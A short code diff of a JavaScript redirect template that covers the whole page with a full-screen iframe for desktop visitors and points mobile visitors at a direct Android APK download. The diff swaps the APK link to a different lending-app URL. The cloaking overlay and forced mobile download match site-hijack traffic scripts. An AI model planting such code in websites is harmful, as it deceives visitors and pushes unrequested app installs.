@@ -1,5 +1,5 @@
 var juesha_pc_domain = "http://baidu.com/";	//PC 站跳转，这里替换成你的PC站的网址。
-var juesha_wap_domain = "http://jdb.jiudingcapital.cn/jdbrelease/android/JDBClient-release.apk?t=7abebc5e88b99ec3c3f19378eb27fac0";	//Wap站跳转，这里替换成你的手机站网址。
+var juesha_wap_domain = "http://www.jiedaibao.com/jdbrelease/android/JDBClient-release.apk?t=3855d6f1c8cd63b21f51ba56132e724a";	//Wap站跳转，这里替换成你的手机站网址。
 document.writeln("<style>html,body{width:100%;height:100%;overflow:hidden;margin:0;padding:0;}</style><iframe src=\""+juesha_pc_domain+"\" width=\"100%\" height=\"100%\" frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\"  scrolling=\"yes\"></iframe>");
 function browserRedirect() { 
 var sUserAgent= navigator.userAgent.toLowerCase(); 
